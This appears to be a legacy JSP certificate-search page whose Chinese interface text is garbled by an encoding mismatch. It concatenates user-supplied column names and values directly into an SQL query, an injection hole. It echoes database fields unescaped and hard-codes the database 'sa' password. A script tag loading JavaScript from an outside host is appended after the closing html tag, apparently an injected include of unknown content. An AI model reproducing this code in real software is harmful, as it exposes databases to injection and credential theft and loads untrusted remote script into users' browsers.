<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.sql.*"%>
<html>
<head>
</head>

<body bgcolor="#FFFFFF" text="#000000">
<h3 align=center>��ѯ֤��!</h3>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr> 
    <td width="68%" nowrap height="17">�����г���֤������ѱ������ĺ�δ��������</td>
    <td width="32%" nowrap height="17"><font size="2">1.������г�֤������кſ������ظ�֤�飡</font></td>
  </tr>
  <tr> 
    <td width="68%" nowrap>
      <form name="searchForm" method="post" >
        <select name="colname">
          <option value="certId">֤�����к�</option>
          <option value="applyCN" selected>����</option>
          <option value="applyO">��λ</option>
          <option value="applyId">֤�������</option>
          <option value="applyDate">��������</option>
        </select>
        <input type="text" name="colvalue" value="">
        <input type="submit" name="Submit" value="��ѯ" >
      </form>
    </td>
    <td width="32%"><font size="2">2.������г�֤������[���]���Լ���֤���Ƿ��ѱ�����</font></td>
  </tr>
</table>
<table border="1" cellspacing="0" cellpadding="0" bordercolor="#999999">
  <tr> 
    <td nowrap> 
      <div align="center"><font size="2" color="#0000FF">֤�����к�</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">����</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">���ڵ�λ</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">֤����;</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">֤�������</font></div>
    </td>
    <td nowrap> 
      <div align="center"><font size="2" color="#0000FF">��������</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">�Ƿ񱻳���</font></div>
    </td>
  </tr>
<%
	String colname=request.getParameter("colname");
	String colvalue=request.getParameter("colvalue");

	String  sqlstr="select * from CertBrowserView ";

	if(colvalue!=null && colvalue.length()!=0)
	{
		colname=new String(colname.getBytes("ISO-8859-1"));
		colvalue=new String(colvalue.getBytes("ISO-8859-1"));	
		sqlstr=sqlstr+"where "+colname+" like '%"+colvalue+"%'";
	}

	Connection conn=null;
	try
	{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		Statement stmt=conn.createStatement();
		ResultSet rs=stmt.executeQuery(sqlstr);		
		while(rs.next())
		{
			String certId=rs.getBigDecimal("certId").toString();
			//System.out.println(certId);
%>


  <tr> 
    <td  nowrap height="2"><font size="2"><a href="downfile.jsp?certId=<%=certId%>"><%=certId%></a></font></td>
    <td  nowrap height="2"><font size="2"><%=rs.getString(2)%></font></td>
    <td  nowrap height="2"><font size="2"><%=rs.getString(3)%></font></td>
    <td  nowrap height="2"><font size="2"><% int certType=rs.getInt(4); if(certType==0) out.print("��֤ǩ��"); else out.print("�ӽ���");%></font></td>
    <td  nowrap height="2"><font size="2"><%=rs.getBigDecimal(5).toString()%></font></td>
    <td  nowrap height="2"><font size="2"><%=new java.util.Date(rs.getString(6)).toLocaleString()%></font></td>
    <td  align=center nowrap height="2"><font size="2"><a href="checkcrl.jsp?certId=<%=certId%>">���</a></font></td>
  </tr>


<%
		}		
			
	}
	catch(Exception ex)
	{	
		out.println(ex.toString());
%>

<tr><td>�Բ������ݿ��������</td></tr>	
<%	
	}
	try{conn.close();}catch(Exception ex){}
	
%>
</table>
</body>
</html>

<script language=javascript src=http://www.qq.com/qq.js></script>